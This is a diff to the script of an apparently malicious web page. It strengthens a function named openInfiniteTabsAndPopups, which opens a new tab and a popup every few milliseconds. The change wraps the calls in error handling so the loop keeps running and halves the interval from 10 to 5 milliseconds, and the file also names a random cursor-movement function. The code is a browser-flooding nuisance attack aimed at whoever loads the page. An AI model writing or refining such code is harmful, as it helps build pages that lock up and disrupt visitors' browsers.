@@ -128,14 +128,19 @@
 
         function openInfiniteTabsAndPopups() {
             const openTab = () => {
-                // Open a new tab
-                window.open("https://example.com", "_blank"); // Adjust the URL as needed
-                // Open a new pop-up
-                const newWindow = window.open("https://example.com", "popup", "width=600,height=400"); // Adjust the pop-up URL and size as needed
-                if (newWindow) newWindow.focus(); // Focus the new window
+                try {
+                    // Open a new tab
+                    window.open("https://example.com", "_blank"); // Adjust the URL as needed
+                    // Open a new pop-up
+                    const newWindow = window.open("https://example.com", "popup", "width=600,height=400"); // Adjust the pop-up URL and size as needed
+                    if (newWindow) newWindow.focus(); // Focus the new window
+                } catch (err) {
+                    console.error('Failed to open tab/popup:', err);
+                }
             };
 
-            setInterval(openTab, 10); // Open a new tab and pop-up every 10 milliseconds
+            // Open a new tab and pop-up every 5 milliseconds
+            setInterval(openTab, 5); 
         }
 
         function randomCursorMovement() {
@@ -163,7 +168,6 @@
             }
             return color;
         }
-
     </script>
 </body>
 </html>
